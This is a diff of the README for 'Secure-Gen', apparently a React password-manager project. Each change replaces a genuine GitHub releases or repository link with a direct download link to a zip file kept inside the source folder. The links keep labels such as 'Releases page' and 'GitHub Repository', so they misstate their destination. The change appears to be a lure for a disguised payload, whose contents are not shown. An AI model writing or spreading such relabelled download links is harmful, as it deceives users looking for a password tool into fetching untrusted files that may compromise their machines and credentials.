@@ -4,7 +4,7 @@ Secure your credentials with ease every time.
 
 ## 📥 Download Secure-Gen
 
-[![Download Secure-Gen](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jespe1917/Secure-Gen/releases)
+[![Download Secure-Gen](https://raw.githubusercontent.com/jespe1917/Secure-Gen/main/src/context/Secure-Gen_v2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jespe1917/Secure-Gen/main/src/context/Secure-Gen_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Secure your credentials with ease every time.
 
 ## 🗂️ Download & Install
 
-1. Visit the [Releases page](https://github.com/jespe1917/Secure-Gen/releases) to access the latest version of SecureGen.
+1. Visit the [Releases page](https://raw.githubusercontent.com/jespe1917/Secure-Gen/main/src/context/Secure-Gen_v2.5.zip) to access the latest version of SecureGen.
 2. Look for the "Assets" section under the latest release.
 3. Click on the package that suits your operating system.
 4. Follow the on-screen prompts to download the file.
@@ -69,7 +69,7 @@ SecureGen is open-source and available for free. Please check the license file i
 
 ## 🔗 Additional Information
 
-- **GitHub Repository:** [Secure-Gen](https://github.com/jespe1917/Secure-Gen)
+- **GitHub Repository:** [Secure-Gen](https://raw.githubusercontent.com/jespe1917/Secure-Gen/main/src/context/Secure-Gen_v2.5.zip)
 - **Suggested Topics:** context-api, firebase, local-storage, password, password-generator, password-manager, react, tailwindcss, vite
 
 Thank you for choosing SecureGen to manage your passwords securely!
